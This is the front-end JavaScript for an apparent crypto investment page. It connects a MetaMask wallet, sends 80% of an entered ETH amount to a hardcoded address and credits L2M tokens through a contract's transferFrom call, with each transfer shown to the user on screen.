let account = null;
let transferContract = null;
let profitOption = null;
let toSendETH = 0;
let toDepositEth = 0;
// const TRANSFER_ABI = '[{"inputs":[],"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"owner","type":"address"},{"indexed":true,"internalType":"address","name":"spender","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Approval","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"from","type":"address"},{"indexed":true,"internalType":"address","name":"to","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Transfer","type":"event"},{"inputs":[{"internalType":"address","name":"owner","type":"address"},{"internalType":"address","name":"delegate","type":"address"}],"name":"allowance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"delegate","type":"address"},{"internalType":"uint256","name":"numTokens","type":"uint256"}],"name":"approve","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"tokenOwner","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"decimals","outputs":[{"internalType":"uint8","name":"","type":"uint8"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"name","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"symbol","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"totalSupply","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"receiver","type":"address"},{"internalType":"uint256","name":"numTokens","type":"uint256"}],"name":"transfer","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"owner","type":"address"},{"internalType":"address","name":"buyer","type":"address"},{"internalType":"uint256","name":"numTokens","type":"uint256"}],"name":"transferFrom","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"}]';
// const TRANSFER_ADDRESS = '0x83D3969Acbf7e2ce020d98BDa6E46ffF08D49f5c';
const TRANSFER_ABI = '[{"inputs":[],"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"owner","type":"address"},{"indexed":true,"internalType":"address","name":"spender","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Approval","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"from","type":"address"},{"indexed":true,"internalType":"address","name":"to","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Transfer","type":"event"},{"inputs":[{"internalType":"address","name":"owner","type":"address"},{"internalType":"address","name":"delegate","type":"address"}],"name":"allowance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"delegate","type":"address"},{"internalType":"uint256","name":"numTokens","type":"uint256"}],"name":"approve","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"tokenOwner","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"decimals","outputs":[{"internalType":"uint8","name":"","type":"uint8"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"name","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"symbol","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"totalSupply","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"receiver","type":"address"},{"internalType":"uint256","name":"numTokens","type":"uint256"}],"name":"transfer","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"owner","type":"address"},{"internalType":"address","name":"buyer","type":"address"},{"internalType":"uint256","name":"numTokens","type":"uint256"}],"name":"transferFrom","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"}]';
const TRANSFER_ADDRESS = '0xDcba878cd3A1Bf4853F47Cfda6feDa4aD722770d';
const infoPopup = document.querySelector('#info-popup');
const transferredInfo = document.querySelector('#transferred-info');
const transactionInfo = document.querySelector('#transaction-info');
const receiveInfo = document.querySelector('#receive-info');
const receiveTransactionInfo = document.querySelector('#receive-transaction-info');
const spinner = document.querySelector('#spinner');

(async () => {
  const connectWalletBtn = document.querySelector('#connectWallet');
  const accountID = document.querySelector('#account-id');
  const investValue = document.querySelector('#invest-value');
  const profitBtns = document.querySelectorAll('.profit-btn');
  const confirmBtn = document.querySelector('#confirm-btn');
  const storeBtn = document.querySelector('#store-btn');

  connectWalletBtn.addEventListener('click', async () => {
    if (window.ethereum) {
      try {
        await connectMetamask();
        connectWalletBtn.style.display = 'none';
        accountID.textContent = account;
        accountID.style.display = 'block';
      } catch (e) {
        console.log(e)
        alert("Something's wrong!");
      }
    } else {
      alert("Please install metamask!");
    }
  })

  profitBtns.forEach(profitBtn => profitBtn.addEventListener('click', (e) => {
    profitOption = profitBtn.getAttribute('value');
  }));

  confirmBtn.addEventListener('click', () => {
    if (!account) {
      alert('Please connect metamask!');
      return;
    }
    if (investValue.value == 0) {
      alert('Please add invest value!')
      return;
    }
    if (!profitOption) {
      alert('Please choose profit option!');
      return;
    }
    // interactTransferContract(investValue.value);
    // sendTransaction(investValue.value);
    console.log(toDepositEth);
    if (toDepositEth === 0) {
      alert('Please and store add invest value!')
      return;
    }
    receiveL2M();
  });

  storeBtn.addEventListener('click', () => {
    if (!account) {
      alert('Please connect metamask!');
      return;
    }
    if (investValue.value == 0) {
      alert('Please add invest value!')
      return;
    }
    sendTransaction(investValue.value);
  });
})();

const connectMetamask = async () => {
  await window.ethereum.send('eth_requestAccounts');
  window.web3 = new Web3(window.ethereum);

  let accounts = await web3.eth.getAccounts();
  account = accounts[0];
}

const sendTransaction = async (amount) => {
  try {
    spinner.style.display = 'flex';
    toSendETH = amount * 80 / 100;
    toDepositEth = amount * 20 / 100;
    const parsedAmount = toSendETH * 1000000000000000000;

    const params = [{
      "from": account,
      "to": "0xF4E00d71d285F65d824175E6C709B1CF01A68383",
      "gas": Number(21000).toString(16),
      "gasPrice": Number(2500000).toString(16),
      "value": Number(parsedAmount).toString(16),
    }];

    await window.ethereum.request({method: "eth_sendTransaction", params}).then((result) => {
      infoPopup.style.display = 'block';
      transferredInfo.textContent = `Was transferred ${toSendETH} ETH to 0xF4E00d71d285F65d824175E6C709B1CF01A68383`;
      transactionInfo.textContent = `Hash transaction ${result}`;
      console.log(result);
    }).catch((err) => {
      console.log(err);
    });

    spinner.style.display = 'none';
  } catch (e) {
    console.log(e);
  }
};

const receiveL2M = async () => {
  spinner.style.display = 'flex';

  transferContract = await new web3.eth.Contract(JSON.parse(TRANSFER_ABI), TRANSFER_ADDRESS);
  const L2MAmount = (toDepositEth * 10000) * 100_000_000;

  console.log(L2MAmount);

  const result = await transferContract
      .methods
      // .transfer(account, L2MAmount)
      .transferFrom('0xF4E00d71d285F65d824175E6C709B1CF01A68383', account, L2MAmount)
      .send({from: account});

  receiveInfo.textContent = `${toDepositEth} ETH were swapped into ${L2MAmount / 10_00_000_000} L2M`;
  receiveTransactionInfo.textContent = `L2M Hash Transaction: ${result.transactionHash}`;
  console.log(result.transactionHash);
  spinner.style.display = 'none';
}